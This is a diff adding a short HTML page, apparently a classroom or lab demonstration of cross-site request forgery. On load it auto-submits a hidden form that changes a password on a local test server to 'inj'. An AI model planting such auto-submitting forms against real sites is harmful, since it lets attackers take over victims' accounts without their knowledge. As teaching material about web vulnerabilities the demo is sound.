@@ -1,0 +1,19 @@
+<html>
+  <head>
+    <title>CSRF Attacker</title>
+  </head>
+  <body onload="document.csrfForm.submit()" style="color:white">
+    <h1>CSRF Demo</h1>
+    Looks like a harmless website, right?
+    <br><br>
+    I could be an ad from an external website!
+
+    <div id="csrfAttack" style="display: none;">
+      <form action="http://localhost:8888/change_password" method="POST" name="csrfForm">
+        <input type="hiden" name="password" value="inj"/>
+        <input type="hiden" name="password_repeat" value="inj"/>
+      </form>
+    </div>
+
+  </body>
+<html>
